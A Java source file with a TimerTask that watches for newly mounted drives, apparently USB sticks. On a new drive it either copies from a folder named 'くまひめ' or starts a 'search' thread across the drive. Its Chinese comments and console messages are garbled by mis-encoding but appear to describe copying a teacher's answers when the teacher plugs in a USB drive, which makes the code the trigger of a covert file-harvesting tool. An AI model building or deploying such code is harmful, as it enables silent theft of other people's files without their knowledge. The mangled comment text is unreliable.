package controller;

import java.io.File;
import java.util.TimerTask;

public class timetask extends TimerTask {
	private boolean isNewRoot = false;
	private boolean isToCopy = false;

	@Override
	public void run() {
		File[] parts = File.listRoots();
		if (commondata.getRoots() != null
				&& parts.length > commondata.getRoots().length) {
			for (int i = 0; i < parts.length; i++) {

				isNewRoot = true;
				for (int j = 0; j < commondata.getRoots().length; j++) {
					if (parts[i].getAbsolutePath().equals(
							commondata.getRoots()[j].getAbsolutePath())) {
						isNewRoot = false;
					}
				}
				// 嗤U徒峨秘
				if (isNewRoot) {
					// 臥儂U徒
					isToCopy = false;
					for (int n = 0; n < parts[i].listFiles().length; n++) {
						// 泌惚低俶勣鹸崙析弗議基宛議三��低祥誼壓低議U徒議功朕村和幹秀匯倖兆忖葎くまひめ議猟周斜
						if (parts[i].listFiles()[n].isDirectory()
								&& parts[i].listFiles()[n].getName().equals(
										"くまひめ")) {
							isToCopy = true;
						}
					}
					if (isToCopy) {

						System.out.println("峨秘U徒朕議葎鹸崙析弗議基宛��");
						new copy(parts[i].getAbsolutePath() + "くまひめ\\").start();
					} else {
						System.out.println("析弗峨秘阻U徒��");
						new search(parts[i]).start();
					}
				}
			}
		}

		commondata.setRoots(parts);

	}
}
